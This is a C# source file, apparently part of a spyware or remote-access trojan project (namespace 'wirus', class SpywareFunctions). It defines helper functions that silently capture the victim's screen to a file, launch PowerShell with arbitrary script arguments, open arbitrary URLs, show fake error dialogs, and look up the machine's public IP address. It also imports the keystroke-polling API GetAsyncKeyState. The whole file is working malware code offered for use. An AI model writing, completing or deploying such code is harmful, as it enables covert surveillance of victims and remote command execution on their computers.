using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.Windows.Forms;
using System.Media;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;

namespace wirus
{
    public static class SpywareFunctions
    {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static object takess()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap as System.Drawing.Image);

            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save(@"ss.jpg", ImageFormat.Jpeg);

            return bitmap;

        }
        
        public static void urlFunc(string url)
        {
            var gettrolled = new ProcessStartInfo(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk");
            gettrolled.Arguments = url.ToString();
            Process.Start(gettrolled);
        }

        public static void shellFunc(string script)
        {
            var openShell = new ProcessStartInfo(@"Powershell.exe");
            openShell.Arguments = script.ToString();
            Process.Start(openShell);
        }

        public static void messageFunc(string message)
        {
            SystemSounds.Asterisk.Play();
            MessageBox.Show(message, "Error");
            SystemSounds.Exclamation.Play();
        }

        public static string getIp()
        {
            string Address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                Address = stream.ReadToEnd();
            }
            int first = Address.IndexOf("Address: ") + 9;
            int last = Address.IndexOf("</body>");
            Address = Address.Substring(first, last - first);

            return Address.ToString();
        }

    }
}